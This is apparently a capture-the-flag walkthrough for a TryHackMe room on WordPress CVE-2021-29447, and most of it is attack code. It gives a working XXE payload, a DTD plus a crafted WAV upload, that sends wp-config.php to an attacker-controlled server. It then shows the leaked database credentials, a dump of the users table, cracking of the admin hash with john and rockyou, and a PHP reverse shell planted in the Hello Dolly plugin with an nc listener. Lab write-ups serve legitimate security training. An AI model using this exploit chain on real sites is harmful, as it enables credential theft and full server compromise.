# WordPress CVE-2021-29447 Exploit Walkthrough  

### Overview  
To protect against CVE-2021-29447, ensure your WordPress version is updated to 5.7.2 or later.  
- **THM Room**: [TryHackMe WordPress CVE-2021-29447](https://tryhackme.com/r/room/wordpresscve202129447)  
- **Write-Up**: [Imdad Miran's Guide](https://imdadmiran.medium.com/tryhackme-wordpress-cve-2021-29447-writeup-cd5dc4a6ea5d)  
- **Video Walkthrough**: [YouTube](https://www.youtube.com/watch?v=tE8Smz1Jvb8)  

---

### Goal  
Use **XXE (XML External Entity)** injection to retrieve the `wp-config.php` file, which contains sensitive database credentials. The server will respond with a Base64-encoded version of the file.  

---

### Step-by-Step Breakdown  

#### **1. Set Up the DTD File (Payload)**  
Create a DTD file with a malicious external entity to read `wp-config.php`.  

**Commands:**  

```bash
nano poc.dtd
```

Content for DTD file:

```bash
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOUR_LOCAL_SERVER_IP:8080/?p=%file;'>" >
```

Example:

```bash
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.101.109.127:8080/?p=%file;'>" >
```

Verify the content:

```bash
cat poc.dtd
```

### 2. Craft the Payload File (poc.wav)
Create a .wav file that triggers the XXE vulnerability.

Command:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOUR_SERVER_IP:PORT/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Example:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.75.33:8080/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

### 3. Set Up a PHP Server
Host the poc.dtd file on your local machine using a PHP server.

Command:

```bash
php -S YOUR_SERVER_IP:PORT
```

Example:

```bash
php -S 10.10.75.33:8080
```

### 4. Upload the Payload (poc.wav)
Upload the poc.wav file to the vulnerable WordPress website.

When the server processes the .wav file, the payload will trigger, and the Base64-encoded data of the wp-config.php file will be sent to your server.

Example Response:

```bash
p=nVZtT+NGEP5cJP7DcK2UKyVxOaSq4lqVQFKCLkdonAjdp2hjr+0Vzu7evoSLTvffO7N2...
```

### 5.Decoding the Base64 String
Option 1: PHP Script (Recommended)
Use a PHP script to decode the Base64 string:

```bash
<?php
$data = 'BASE64_STRING';
echo base64_decode($data);
?>
```

Option 2: Command Line

```bash
echo "BASE64_STRING" | base64 -d
```

### 6. Run the file:
   ```bash
   php revshell.php
   ```

   Will get the decoding with WP Info

   Check the Decoded File
   Once decoded, open or check the file in terminal:


Example Output:

```bash
root@ip-10-10-75-130:~# php revshell.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb2' );

/** MySQL database username */
define( 'DB_USER', 'thedarktangent' );

/** MySQL database password */
define( 'DB_PASSWORD', 'sUp3rS3cret132' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wptry_';
```

### 7. Login to MySQL Server:

 Make sure msql is installed:

 ```bash
 apt install mysql-client
 apt install mysql-client-core-5.7   
 apt install mariadb-client-core-10.1
 ```

new bash
```bash
mysql -h 10.10.153.214 -u thedarktangent -p 
enter password:
sUp3rS3cret132
```

get db version
```bash
SELECT version();
```

get port
```bash
show variables LIKE 'port';
```

### 8. Show databases and get the admin user password hash:

in msql server
```bash
show databases;
```

choose the db
```bash
use wordpressdb2;
show tables;
```

select everything form the users table:
```bash
SELECT * FROM wptry_users;
```

Check hash type (optional):
```bash
hash-identifier
paste password:
$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1
should be MD5
exit
```

### 9. Crack password hash:
```bash
nano hash-wordpress.txt
john hash-wordpress.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

in this case its: teddybear

### 10. Login in WP as Admin User:

user:

corp-001

passwr:

teddybear

### 11. Next: Create a Reverse Shell

Replace template with reverse shell from pentest monkey
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

add the code to a plugin (hello dolly for example - should not be active)

Alternative:
Find code if exist:
```bash
cd /root/Tools
ls
cd php-webshells
ls
```
```bash
nano php-reverse-shell.php
```

Add the code and make sure to edit local ip address and port if needed


listen to server
```bash
nc -lvnp 1234
```

Paste the code in plugin editor hello dolly and save

Navigate to plugin path
http://10.10.153.214/wp-content/plugins/hello.php


12. Find the flag:

remote shell:
```bash
ls
cd home
ls
cd stux
ls
cd flag
ls
cat flag.txt
thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}
```

For further exploration is to escalate privilidges...